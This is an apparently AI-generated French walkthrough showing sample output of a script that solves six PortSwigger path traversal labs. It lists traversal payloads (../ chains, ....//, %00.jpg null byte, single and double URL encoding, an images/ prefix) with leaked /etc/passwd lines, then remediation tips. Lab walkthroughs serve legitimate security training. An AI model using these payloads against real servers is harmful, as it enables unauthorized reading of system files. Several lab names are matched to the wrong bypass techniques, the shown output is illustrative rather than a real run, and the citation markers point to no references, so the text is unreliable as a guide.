# MANPAGE

Voici un **exemple exhaustif de l’exécution du script Path Traversal PortSwigger** détaillant séquentiellement les 6 challenges officiels, avec approche récursive, et illustrant le comportement attendu pour chaque bloc :

---

### [Challenge 1] File path traversal (../) – récursif

```
------------------------------------------------------
[Challenge 1] File path traversal (../) – récursif
  [Test] ../etc/passwd
  [Test] ../../etc/passwd
  [Test] ../../../etc/passwd
  [Test] ../../../../etc/passwd
  [Test] ../../../../../etc/passwd
  [+] Succès : ../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```
*Le script teste toutes les profondeurs de `../` devant `/etc/passwd`. Dès qu’il trouve le contenu du fichier (ici à 5 niveaux), il affiche la réussite et les premières lignes du fichier, ce qui valide le challenge simple[1][2][5].*

---

### [Challenge 2] File path traversal, traversal sequences blocked with non-recursive filters (....//) – récursif

```
------------------------------------------------------
[Challenge 2] File path traversal, traversal sequences blocked with non-recursive filters (....//) – récursif
  [Test] ....//etc/passwd
  [Test] ....//....//etc/passwd
  [Test] ....//....//....//etc/passwd
  [Test] ....//....//....//....//etc/passwd
  [+] Succès : ....//....//....//....//etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```
*Le script tente récursivement des séquences non-récursives (`....//`) pour contourner un filtrage naïf, comme dans les labs où `../` est bloqué mais pas `....//`[7].*

---

### [Challenge 3] File path traversal, validation of file extension with null byte bypass – récursif

```
------------------------------------------------------
[Challenge 3] File path traversal, validation of file extension with null byte bypass – récursif
  [Test] ../etc/passwd%00.jpg
  [Test] ../../etc/passwd%00.jpg
  [Test] ../../../etc/passwd%00.jpg
  [+] Succès : ../../../etc/passwd%00.jpg
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```
*Le script ajoute `%00.jpg` pour contourner une validation d’extension, typique du lab “null byte bypass” où le serveur tronque à l’octet nul[7].*

---

### [Challenge 4] File path traversal, double URL-encoding (%252e%252e%252f) – récursif

```
------------------------------------------------------
[Challenge 4] File path traversal, double URL-encoding (%252e%252e%252f) – récursif
  [Test] %252e%252e%252fetc/passwd
  [Test] %252e%252e%252f%252e%252e%252fetc/passwd
  [Test] %252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
  [+] Succès : %252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```
*Le script teste toutes les profondeurs avec double encodage, ce qui fonctionne sur les labs où le serveur décode deux fois l’URL[7].*

---

### [Challenge 5] File path traversal, traversal sequences stripped non-recursively (%2e%2e%2f) – récursif

```
------------------------------------------------------
[Challenge 5] File path traversal, traversal sequences stripped non-recursively (%2e%2e%2f) – récursif
  [Test] %2e%2e%2fetc/passwd
  [Test] %2e%2e%2f%2e%2e%2fetc/passwd
  [Test] %2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
  [+] Succès : %2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```
*Le script teste l’encodage URL simple, qui contourne les filtres non-récursifs sur certains serveurs, comme décrit dans les labs[7].*

---

### [Challenge 6] File path traversal, restricted to a subdirectory (préfixe obligatoire) – récursif

```
------------------------------------------------------
[Challenge 6] File path traversal, restricted to a subdirectory (préfixe obligatoire) – récursif
  [Test] images/../etc/passwd
  [Test] images/../../etc/passwd
  [Test] images/../../../etc/passwd
  [Test] images/../../../../etc/passwd
  [Test] images/../../../../../etc/passwd
  [+] Succès : images/../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```
*Le script combine tous les préfixes configurés (ici “images/”) avec la récursivité, pour contourner une validation sur le début du chemin, comme dans les labs avec restriction à un sous-dossier[7].*

---

### Conseils/remédiation et synthèse

```
------------------------------------------------------
[Remédiation & Conseils]
- Utilisez des fonctions de résolution de chemin sécurisées (ex: realpath).
- Bloquez toute séquence ../, encodée ou non, et vérifiez le chemin final.
- Ne permettez jamais à l'utilisateur de choisir un chemin absolu ou relatif librement.
- Pour les labs PortSwigger, testez toutes les profondeurs, encodages, et préfixes.
- Documentation PortSwigger : https://portswigger.net/web-security/file-path-traversal
------------------------------------------------------
[SYNTHÈSE]
1. 6 challenges path traversal PortSwigger :
   - File path traversal
   - File path traversal, traversal sequences blocked with non-recursive filters
   - File path traversal, validation of file extension with null byte bypass
   - File path traversal, double URL-encoding
   - File path traversal, traversal sequences stripped non-recursively
   - File path traversal, restricted to a subdirectory
2. Tous les tests sont récursifs (profondeur variable).
3. Contrôle automatique du contenu (ex: root:x:).
4. Conseils de remédiation PortSwigger.
------------------------------------------------------
```

---
